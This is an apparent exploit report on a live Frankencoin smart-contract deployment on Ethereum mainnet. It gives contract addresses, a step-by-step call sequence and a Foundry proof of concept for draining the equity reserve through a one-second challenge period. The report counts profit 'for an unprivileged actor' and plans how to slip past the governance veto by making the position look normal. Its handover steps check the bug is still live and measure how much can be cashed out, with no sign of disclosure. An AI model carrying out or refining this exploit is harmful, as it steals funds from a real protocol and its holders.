# EX-01 — Frankencoin: zero-second challenge period drains the equity reserve

**Net for an unprivileged actor:** ~**$500,000** (489,000 ZCHF after the 1,000 ZCHF opening fee; ~$590k at the $1.2053 spot, ~$500k after selling into the $2.23M ZCHF/USDT pool)
**Confidence:** HIGH on the contract path and PoC; MEDIUM on realizing the full $500k because of DEX depth
**Gate:** none hard. Qualified FPS holders can veto a new position during its 3-day init period; a recent probe was denied, so the veto is a real but not guaranteed risk.
**Chain:** Ethereum mainnet (1)
**Status:** headline CS-ZCHF-034 is PATCHED. This is a **new live bug** in the same deployment.

## Contracts

| Role | Address |
|---|---|
| MintingHub | `0x7546762fdb1a6d9146b33960545c3f6394265219` |
| ZCHF | `0xB58E61C3098d85632Df34EecfB899A1Ed80921cB` |
| DAI | `0x6B175474E89094C44Da98b954EedeAC495271d0F` |
| Reserve / equity | `0x1bA26788dfDe592fec8bcB0Eaff472a42BE341B2` |
| PositionFactory | `0x0cde500e…` (positions cloned from it) |

Live state at the PoC block: `equity()` ≈ 3,550,550 ZCHF, `reserve` ≈ 12,015,015 ZCHF, ZCHF totalSupply ≈ 30.6M.

## Bug

`MintingHub.openPosition()` accepts any `uint64 _challengeSeconds`, including `1`. `Position.challengeData()` returns `phase2 = challengePeriod`, and `MintingHub._calculatePrice()` returns 0 once `block.timestamp >= start + phase2`. A position owner can therefore:

1. Open a position with normal collateral and `challengeSeconds = 1`.
2. Wait out the 3-day init period and mint the full limit.
3. Self-challenge the full collateral. The challenge locks the same amount of DAI for one block.
4. Two seconds later call `bid()`. The Dutch price is 0, so the bidder pays 0, receives the collateral, and `_finishChallenge()` calls `zchf.coverLoss(hub, repayment)` then `burnWithoutReserve(...)`. The reserve/equity pays the entire minted amount.

The attacker recovers 100% of the DAI and keeps the minted ZCHF minus the 2% reserve and the 1,000 ZCHF opening fee.

## Step-by-step

```
openPosition(DAI, 500_000e18, 500_000e18, 500_000e18,
             3 days, 365 days, 1 /*challengeSeconds*/, 0, 1e18, 20_000)
warp(3 days + 1)
mint(attacker, 500_000e18)          // 490,000 ZCHF after 2% reserve
challenge(position, 500_000e18, 1e18)
warp(2 seconds)
bid(index, 500_000e18, false)       // price 0; collateral returned; reserve covers 500k
```

## PoC

`stage3/work/S3-049/Frankencoin_0x754676/poc/test/FrankencoinPoC.t.sol`

Key assertions:

```solidity
assertEq(daiEnd, 1_000_000e18, "capital recovered");
assertGt(zchfEnd, 480_000e18, "profit in ZCHF");
```

Run:

```bash
cd stage3/work/S3-049/Frankencoin_0x754676/poc
RPC_URL=<ethereum-rpc> /workspaces/CA/research/tools/foundry/forge test \
  --match-test testFreeMintZeroChallengePeriod -vv
```

Expected: `dai end = 1,000,000e18`, `zchf end = 490,000e18`, reserve loss = 500,000 ZCHF.

## Economics

- Capital: 1,000,000 DAI, fully recovered; only sunk cost is the 1,000 ZCHF opening fee.
- Gross: 490,000 ZCHF; net 489,000 ZCHF.
- At $1.2053 spot: ~$590k. Selling 490k ZCHF into the $2.23M ZCHF/USDT pool moves the price; realistic net ~$500k.
- Ceiling: the entire equity reserve (~3.55M ZCHF, ~$4.26M) if repeated at scale, but each position needs 3 days of init and FPS does not veto.

## Evidence

- `evidence/positions_data.json` — 57 positions, all closed, no live cloneable parent with a short period.
- `evidence/state.txt` / `zchf_state.txt` — reserve, equity, supply.
- `evidence/logs_PositionOpened.json`, `logs_ChallengeStarted.json`.
- `evidence/src/` — verified `MintingHub.sol`, `Position.sol`, `Frankencoin.sol`, `Equity.sol`.
- PoC output: `poc/poc_result.txt`.

## Risks / caveats

- **FPS veto:** qualified FPS holders can deny a new position during the 3-day init. A recent absurd probe was denied. The attacker needs a position that looks normal apart from the 1-second challenge period; if FPS watches, the position can be denied. This is the main reason the finding is not a guaranteed payday.
- **DEX depth:** the $500k figure assumes selling 490k ZCHF into the live ZCHF/USDT pool; actual slippage must be measured.
- **Governance response:** the owner can patch `openPosition` to enforce a minimum challenge period.

## Handover

1. Confirm the live `MintingHub` still accepts `challengeSeconds = 1` and that `openPosition` has no minimum.
2. Re-run the PoC at the latest block; confirm `expiredPurchasePrice == 0` and the reserve loss.
3. Measure the ZCHF/USDT pool depth and compute the realistic sale.
4. Check FPS veto activity: how many recent positions were denied, and whether a normal-looking 500k DAI position would pass.
5. If the veto is reliable, downgrade to GATED; if not, this is the largest live finding in the campaign.
